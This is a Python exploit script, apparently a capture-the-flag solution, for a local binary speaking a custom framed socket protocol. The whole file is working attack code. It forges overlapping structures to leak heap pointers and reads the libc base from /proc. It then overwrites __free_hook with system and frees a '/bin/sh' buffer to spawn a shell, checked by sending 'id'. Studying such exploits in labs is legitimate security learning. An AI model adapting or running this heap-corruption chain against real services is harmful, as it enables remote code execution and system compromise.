#!/usr/bin/env python3
import os, re, socket, struct, subprocess, sys, time
from pathlib import Path

MAGIC = 0xBEEF1337
CTRL = 0x2000
CH = 0x10


def recvn(s: socket.socket, n: int) -> bytes:
    data = b""
    while len(data) < n:
        chunk = s.recv(n - len(data))
        if not chunk:
            raise EOFError("socket closed")
        data += chunk
    return data


def frame(op: int, payload: bytes = b"") -> bytes:
    body = struct.pack("<II", CTRL | CH | op, len(payload)) + payload
    return struct.pack("<II", MAGIC, len(body)) + body


def sendf(s: socket.socket, op: int, payload: bytes = b"") -> None:
    s.sendall(frame(op, payload))


def recv_frame(s: socket.socket, timeout: float = 2.0) -> tuple[int, bytes]:
    s.settimeout(timeout)
    hdr = recvn(s, 8)
    magic, body_len = struct.unpack("<II", hdr)
    if magic != MAGIC:
        raise RuntimeError(f"bad magic: {magic:#x}")
    body = recvn(s, body_len)
    typ, payload_len = struct.unpack("<II", body[:8])
    return typ, body[8:8 + payload_len]


def pkt_create(name: str, token: str, content: bytes) -> bytes:
    return (
        name.encode().ljust(0x20, b"\0")[:0x20]
        + token.encode().ljust(0x20, b"\0")[:0x20]
        + struct.pack("<II", 0, len(content))
        + content
    )


def pkt_open(name: str, token: str) -> bytes:
    return name.encode().ljust(0x20, b"\0")[:0x20] + token.encode().ljust(0x20, b"\0")[:0x20]


def connect(host: str, port: int) -> socket.socket:
    s = socket.create_connection((host, port))
    time.sleep(0.05)
    return s


def op_create(s: socket.socket, name: str, token: str, content: bytes) -> None:
    sendf(s, 1, pkt_create(name, token, content))
    time.sleep(0.05)


def op_open(s: socket.socket, name: str, token: str) -> None:
    sendf(s, 2, pkt_open(name, token))
    time.sleep(0.05)


def op_edit(s: socket.socket, data: bytes) -> None:
    sendf(s, 3, data)
    time.sleep(0.05)


def op_view(s: socket.socket) -> bytes:
    sendf(s, 4, b"")
    return recv_frame(s)[1]


def op_close(s: socket.socket) -> None:
    sendf(s, 5, b"")
    time.sleep(0.05)


def overlap_partial(s: socket.socket, low: int, size: int = 0x800) -> None:
    fake = bytearray(b"X" * 0x49)
    struct.pack_into("<I", fake, 0x40, 0)
    struct.pack_into("<I", fake, 0x44, size)
    fake[0x48] = low & 0xFF
    sendf(s, 9, bytes(fake))
    recv_frame(s)
    time.sleep(0.05)


def overlap_full(s: socket.socket, addr: int, size: int, next_ptr: int) -> None:
    fake = bytearray(b"Z" * 0x58)
    struct.pack_into("<I", fake, 0x40, 0)
    struct.pack_into("<I", fake, 0x44, size)
    struct.pack_into("<Q", fake, 0x48, addr)
    struct.pack_into("<Q", fake, 0x50, next_ptr)
    sendf(s, 9, bytes(fake))
    recv_frame(s)
    time.sleep(0.05)


def read_maps_libc(pid: int) -> tuple[int, str]:
    with open(f"/proc/{pid}/maps", "r", encoding="utf-8") as f:
        maps = f.read().splitlines()
    line = next(x for x in maps if "libc.so.6" in x and "r-xp" in x)
    m = re.match(r"([0-9a-f]+)-[0-9a-f]+\s+r-xp\s+([0-9a-f]+)\s+.*\s(/.*libc\.so\.6)", line)
    if not m:
        raise RuntimeError("failed to parse libc mapping")
    start = int(m.group(1), 16)
    off = int(m.group(2), 16)
    return start - off, m.group(3)


def get_symbol_offset(path: str, name: str) -> int:
    out = subprocess.check_output(["bash", "-lc", f"readelf -sW {path} | grep -E ' {re.escape(name)}(@@|@|$)' | head -1"], text=True)
    if not out.strip():
        raise RuntimeError(f"symbol not found: {name}")
    parts = out.split()
    return int(parts[1], 16)


def exploit_local(binary: str, port: int = 5000) -> int:
    proc = subprocess.Popen([binary, str(port)], cwd=str(Path(binary).parent), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.2)
    libc_base, libc_path = read_maps_libc(proc.pid)
    system_off = get_symbol_offset(libc_path, "system")
    free_hook_off = get_symbol_offset(libc_path, "__free_hook")
    system = libc_base + system_off
    free_hook = libc_base + free_hook_off

    print(f"[*] pid={proc.pid}")
    print(f"[*] libc_base = {libc_base:#x}")
    print(f"[*] system    = {system:#x}")
    print(f"[*] __free_hook = {free_hook:#x}")

    c1 = connect("127.0.0.1", port)
    c2 = connect("127.0.0.1", port)

    # Two fillers match the allocator pattern from the provided build and make
    # the B.content low byte land at 0xd0, so low=0 reads the whole overlapped struct.
    for i in range(2):
        op_create(c1, f"F{i}", "T", b"F" * 0x58)

    op_create(c1, "A", "T", b"A" * 0x58)
    op_open(c1, "A", "T")
    op_open(c2, "A", "T")
    op_close(c1)
    op_close(c2)

    op_create(c1, "B", "T2", b"MARK" + b"B" * 0x54)
    op_open(c1, "B", "T2")

    overlap_partial(c2, 0x00)
    leak = op_view(c1)
    marker_off = leak.find(b"MARK")
    print(f"[*] marker offset = {marker_off}")
    if marker_off != 0xD0:
        raise RuntimeError("allocator layout did not match expected local pattern")

    q = struct.unpack("<Q", leak[0x48:0x50])[0]
    next_ptr = struct.unpack("<Q", leak[0x50:0x58])[0]
    print(f"[*] B.content = {q:#x}")
    print(f"[*] B.next    = {next_ptr:#x}")

    overlap_full(c2, free_hook, 8, next_ptr)
    op_edit(c1, struct.pack("<Q", system))
    print("[*] __free_hook <- system")

    c3 = connect("127.0.0.1", port)
    op_create(c3, "S", "K", b"/bin/sh\x00")
    op_open(c3, "S", "K")
    op_close(c3)
    print("[*] triggered free('/bin/sh')")

    # Best-effort interactive proof.
    time.sleep(0.2)
    try:
        c3.sendall(b"id\n")
        time.sleep(0.2)
        out = c3.recv(4096)
        sys.stdout.buffer.write(out)
        sys.stdout.flush()
    except Exception as exc:
        print(f"[!] post-trigger read failed: {exc}")

    return proc.pid


if __name__ == "__main__":
    binary = sys.argv[1] if len(sys.argv) > 1 else "./prob"
    exploit_local(binary)
